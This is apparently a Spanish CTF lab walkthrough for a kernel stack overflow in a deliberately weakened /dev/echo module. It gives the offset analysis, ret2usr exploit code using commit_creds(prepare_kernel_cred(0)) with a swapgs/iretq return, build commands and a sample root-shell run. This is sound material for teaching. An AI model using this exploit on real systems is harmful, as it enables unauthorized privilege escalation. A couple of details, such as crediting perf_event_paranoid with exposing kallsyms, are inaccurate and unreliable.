# CH01 — Echo Chamber: ret2usr

**Nivel recomendado:** 0 (sin SMEP, SMAP, KASLR ni KPTI)
**Dispositivo:** `/dev/echo` (`read` / `write`)
**Concepto nuevo:** desbordar un buffer de pila del kernel, sobrescribir la dirección de retorno y ejecutar código de usuario desde ring 0 (*ret2usr*), y volver a ring 3 sin que el sistema falle.

---

## Objetivo

Pasar de `uid=1000(ctf)` a `uid=0(root)` y leer `/root/flag.txt`.

---

## Paso 1: entender el bug

Lee `src/ch01-echo-chamber/vuln_echo.c`, función `echo_write`:

```c
char stack_buf[BUF_SIZE];          /* BUF_SIZE = 64 */
if (copy_from_user(stack_buf, buf, count))   /* count viene del usuario */
    return -EFAULT;
```

`count` no se valida contra `BUF_SIZE` antes de copiar. Cualquier escritura de más de 64 bytes sale del buffer, pisa lo que hay encima en la pila y llega a la dirección de retorno.

> **Nota del laboratorio.** El módulo está compilado sin protector de pila (`-fno-stack-protector`) y usa `raw_copy_from_user`. En un kernel 6.1 normal, `check_copy_size()` bloquea copias mayores que el objeto y el canario de pila detiene el ataque. Aquí se desactivan a propósito para que el primer reto sea sobre el concepto de ret2usr. En los retos siguientes, la protección vuelve a ser parte del problema.

---

## Paso 2: encontrar el desplazamiento exacto

Desensambla el módulo (desde la VM o desde el host):

```bash
objdump -d challenges/ch01-echo-chamber/vuln_echo.ko | sed -n '/<echo_write>:/,/^$/p' | head -20
```

Fragmento relevante (salida real de este build):

```
push   %rbp               ; +8  (rbp guardado)
push   %rbx               ; +16 (rbx guardado)
sub    $0x40,%rsp         ; 64 bytes de buffer
mov    %rsp,%rbp          ; buf = rsp
...
```

Diseño de la pila, de abajo arriba:

| Desplazamiento desde `buf` | Contenido |
|---|---|
| `0x00` – `0x3f` | `stack_buf` (64 bytes) |
| `0x40` | rbx guardado |
| `0x48` | rbp guardado |
| `0x50` | **dirección de retorno** |

Desplazamiento hasta la dirección de retorno: **80 bytes**. Para sobrescribirla, el payload necesita 80 bytes de relleno seguidos de 8 bytes con la dirección que quieres ejecutar.

Comprueba que el `ret` del epílogo es el que usa esa posición:

```
add    $0x40,%rsp
pop    %rbx
pop    %rbp
ret                        ; ← lee [rsp] = dirección sobrescrita
```

---

## Paso 3: qué ejecutar

Necesitas tres direcciones del kernel:

- `commit_creds`: cambia las credenciales del proceso actual.
- `prepare_kernel_cred(0)`: crea credenciales de root (uid 0).
- Una función tuya en ring 0 que llame a ambas y luego vuelva a ring 3.

En este nivel no hay KASLR, así que las direcciones son fijas. Léelas en la VM:

```bash
grep -E ' (commit_creds|prepare_kernel_cred)$' /proc/kallsyms
```

```
ffffffff8109a930 T commit_creds
ffffffff8109abd0 T prepare_kernel_cred
```

El exploit las lee en tiempo de ejecución desde `/proc/kallsyms`, así que no hace falta copiarlas a mano. Esto solo funciona en el nivel 0: el arranque con `nokaslr` pone `perf_event_paranoid=1` para que `kallsyms` muestre direcciones reales.

---

## Paso 4: volver a ring 3 con `swapgs; iretq`

Tu código corre en ring 0 con el `GS` de usuario y con la pila del kernel. Para regresar a usuario hay que:

1. Ejecutar `swapgs` para restaurar `GS` del kernel.
2. Empujar los cinco valores del marco de interrupción en este orden: `SS`, `RSP`, `RFLAGS`, `CS`, `RIP`.
3. Ejecutar `iretq`.

Antes de disparar el overflow, guarda en `main` los valores de usuario (`cs`, `ss`, `rsp`, `rflags`). Así `RIP` apunta a `get_root_shell`, que ya corre como root y lanza `/bin/sh`.

---

## Paso 5: el exploit

Código completo en [`ch01-echo-chamber/exploit.c`](ch01-echo-chamber/exploit.c). Partes clave:

```c
/* 80 bytes de relleno + dirección de retorno */
memset(payload, 'A', OFFSET);                       /* OFFSET = 80 */
*(unsigned long *)(payload + OFFSET) = (unsigned long)kernel_payload;
write(fd, payload, sizeof(payload));                /* 88 bytes */
```

```c
static void kernel_payload(void)
{
    commit(prep(0));                                /* root */
    asm volatile(
        "swapgs\n\t"
        "pushq %0\n\t"  /* SS     */
        "pushq %1\n\t"  /* RSP    */
        "pushq %2\n\t"  /* RFLAGS */
        "pushq %3\n\t"  /* CS     */
        "pushq %4\n\t"  /* RIP    */
        "iretq" ...);
}
```

Compilar sin protector de pila (el canario de userland no aporta nada aquí):

```bash
gcc -static -O0 -fno-stack-protector -o exploit exploit.c
```

---

## Paso 6: ejecutarlo

En el host:

```bash
cd challenges/ch01-echo-chamber
cp /ruta/a/exploit shared/
./run.sh 0
```

Dentro de la VM:

```
~ $ /shared/exploit
[*] commit_creds         @ 0xffffffff8109a930
[*] prepare_kernel_cred  @ 0xffffffff8109abd0
[*] escribiendo 88 bytes en /dev/echo
[+] uid=0, lanzando shell de root
~ # id
uid=0(root) gid=0(root)
~ # cat /root/flag.txt
FLAG{...}
```

---

## Problemas comunes

| Síntoma | Causa probable |
|---|---|
| `/proc/kallsyms` muestra `0000000000000000` | Estás en un nivel con KASLR. Con `nokaslr` el arranque relaja `perf_event_paranoid`. |
| `write` devuelve `EFAULT` | Usas `copy_from_user` con más de 64 bytes en un kernel normal. Aquí el módulo ya usa `raw_copy_from_user`. |
| Kernel panic tras el `iretq` | Falta `swapgs` o el orden de los cinco valores es incorrecto. |
| Te quedas en uid 1000 | El relleno no llega a 80 bytes exactos; revisa el `OFFSET`. |

---

## Qué aprendiste

- Un `copy_from_user` sin límite en pila es un overflow clásico.
- El diseño de la pila (`push`, `sub rsp`, `ret`) decide el desplazamiento; se lee con `objdump`.
- `commit_creds(prepare_kernel_cred(0))` es la forma estándar de obtener root desde el kernel.
- Volver a ring 3 exige un marco de `iretq` válido; sin `swapgs` el kernel se cae.

**Siguiente reto:** [CH02](ch02-echo-chamber-v2.md), donde SMEP impide ret2usr y necesitas ROP y un leak de KASLR.
